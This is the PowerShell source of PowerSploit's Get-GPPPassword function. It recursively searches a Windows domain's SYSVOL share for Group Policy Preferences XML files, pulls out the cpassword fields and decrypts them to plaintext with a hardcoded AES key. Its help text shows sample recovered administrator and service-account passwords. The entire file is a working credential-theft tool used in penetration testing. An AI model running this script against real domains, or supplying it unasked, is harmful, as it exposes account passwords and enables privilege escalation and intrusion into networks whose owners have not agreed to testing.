function Get-GPPPassword {
<#
.SYNOPSIS

    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 2.3.1
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.EXAMPLE

    PS C:\> Get-GPPPassword
    
    Password : {password12}
    Changed  : {2014-02-21 05:28:53}
    UserName : {test1}
    NewName  : {}
    File     : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources

    Password : {Recycling*3ftw!, password123, password1234}
    Changed  : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    UserName : {Administrator (built-in), DummyAccount, dummy2}
    NewName  : {mspresenters, $null, $null}
    File     : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups

    Password : {password, password1234$}
    Changed  : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    UserName : {administrator, admin}
    NewName  : {}
    File     : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks

    Password : {password, read123}
    Changed  : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    UserName : {DEMO\Administrator, admin}
    NewName  : {}
    File     : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services

.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    
    [CmdletBinding()]
    Param ()
    
    #define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            #Append appropriate padding based on string length  
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    #define helper function to parse fields from xml files
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File 
        )
    
        try {
            
            #$FileObject = Get-ChildItem $File
            $Filename = Split-Path $File -Leaf
            $Filepath = Split-Path $File -Parent
            [xml] $Xml = Get-Content ($File)

            #declare empty arrays
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            #check for password field
            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {

                    'Groups.xml' {
                        $Count = $Xml.Groups.User.Count
                        If (!($Count)) {$Count = 1}
                        ForEach ($Number in 0..($Count - 1)){
                            If ($Count -eq 1) {$Replace = 'User'} else {$Replace = "User[$Number]"}
                            $Cpassword += , $Xml.Groups.$Replace.Properties.cpassword
                            $UserName += , $Xml.Groups.$Replace.Properties.userName
                            $NewName += , $Xml.Groups.$Replace.Properties.newName
                            $Changed += , $Xml.Groups.$Replace.changed
                        }
                    }
        
                    'Services.xml' {
                        $Count = $Xml.NTServices.NTService.Count
                        If (!($Count)) {$Count = 1}
                        ForEach ($Number in 0..($Count - 1)){                        
                            If ($Count -eq 1) {$Replace = 'NTService'} else {$Replace = "NTService[$Number]"}
                            $Cpassword += , $Xml.NTServices.NTService.$Replace.Properties.cpassword
                            $UserName += , $Xml.NTServices.NTService.$Replace.Properties.accountName
                            $Changed += , $Xml.NTServices.NTService.$Replace.changed
                        }
                    }
        
                    'Scheduledtasks.xml' {
                        $Count = $Xml.ScheduledTasks.Task.Count
                        If (!($Count)) {$Count = 1}
                        ForEach ($Number in 0..($Count - 1)){                                                
                            If ($Count -eq 1) {$Replace = 'Task'} else {$Replace = "Task[$Number]"}
                            $Cpassword += , $Xml.ScheduledTasks.Task.$Replace.Properties.cpassword
                            $UserName += , $Xml.ScheduledTasks.Task.$Replace.Properties.runAs
                            $Changed += , $Xml.ScheduledTasks.Task.$Replace.changed
                        }
                    }
        
                    'DataSources.xml' {
                        $Count = $Xml.DataSources.DataSource.Count
                        If (!($Count)) {$Count = 1}
                        ForEach ($Number in 0..($Count - 1)){
                            If ($Count -eq 1) {$Replace = 'DataSource'} else {$Replace = "DataSource[$Number]"}
                            $Cpassword += , $Xml.DataSources.$Replace.Properties.cpassword
                            $UserName += , $Xml.DataSources.$Replace.Properties.username
                            $Changed += , $Xml.DataSources.$Replace.changed
                        }
                    }
                }
            }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }
                  
            #Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $Filepath}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            Return $ResultsObject
   
        }

        catch {Write-Error $Error[0]}

    }
    
    try {
        #ensure that machine is domain joined and script is running as a domain account
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) )
        {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }
    
        #discover potential files containing passwords ; not complaining in case of denied access to a directory
        Write-Verbose 'Searching the DC. This could take a while.'
        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
    
        if ( -not $XMlFiles )
        {
            throw 'No preference files found.'
        }

        Write-Verbose "Found $($XMLFiles.Count) files that could contain passwords."
    
        foreach ($File in $XMLFiles) {
        
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}
